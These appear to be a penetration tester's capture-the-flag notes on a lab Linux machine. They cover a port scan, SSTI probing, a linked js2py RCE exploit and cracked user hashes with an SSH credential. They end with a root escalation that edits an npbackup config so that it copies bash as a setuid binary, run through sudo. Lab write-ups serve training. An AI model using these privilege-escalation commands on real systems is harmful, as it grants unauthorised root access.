
# CodePartTwo - Linux - Easy

# IP=`10.10.11.82`

-------------------------------------------------------------------------------------------

# Enum

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)

8000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
```

## ports : 22,8000

-------------------------------------------------------------------------------------------

# web - port:8000

## gunicorn/20.0.4 -> CVE-2024-1135 http req smug?

## source code var

flask : app.secret_key = 'S3cr3tK3yC0d3PartTw0'

dashboard.html > templateler var : SSTI ?

## SSTI
javascript code editor'de ssti var.

burpsuite ssti indentification sheet'e bakarak: `{{7*'7'}}`: Jinja2,Twig,other
sonra chatgpt ile analize devam ettim: `{{ '7' * 1 }}  : 7 ve {{ '7' - 0 }} : 7 ve{{ ('7').toString() }}: 7`
Node/JS tabanlı bir template engine dedi.

source code'da şu vardı: `js2py.eval_js(code)`: RCE demek

## js2py==0.74 : `CVE-2024-28397`
> https://github.com/naclapor/CVE-2024-28397/tree/main

-------------------------------------------------------------------------------------------

# Initial access - app

## users.db
```sql
sqlite> select * from user
   ...> ;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

## ssh CRED: `marco:sweetangelbabylove`

## user.txt: `8852a38031c56eeea1eaca6742ea0963`

## sudo -l
```bash
sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

```python
cat /usr/local/bin/npbackup-cli
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from npbackup.__main__ import main
if __name__ == '__main__':
    # Block restricted flag
    if '--external-backend-binary' in sys.argv:
        print("Error: '--external-backend-binary' flag is restricted for use.")
        sys.exit(1)

    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

## npbackup.conf

şunları değiştirdim.
* /home/app/app -> `/usr/bin` (ne olduğu çok önemli değil backup repeat sorunu çıkartmasın diye)
* post_exec_commands: [] -> `post_exec_commands: [/bin/cp /bin/bash /tmp/tmp/pwn; /bin/chmod +s /tmp/tmp/pwn]`

ve default olan bu işimizi iyiye götürüyor:
post_exec_execute_even_on_backup_error: true


```yaml
cat npbackup.conf 
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /usr/bin
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: [/bin/cp /bin/bash /tmp/tmp/pwn; /bin/chmod +s /tmp/tmp/pwn]
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```

run
argümanlarını help menüsü ile buldum.
-c: config file -b: backup -f: force.
```bash
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf -b -f
```
bu arada tam path belirtmeyince çalışmadı 1-2 kere. sebebi bilinmez.

root shell aktifleştir
```bash
/tmp/tmp/pwn -p
```


# root.txt : `f19bee6ccdfa35e57b94e4a2cca91e1d`

-------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------
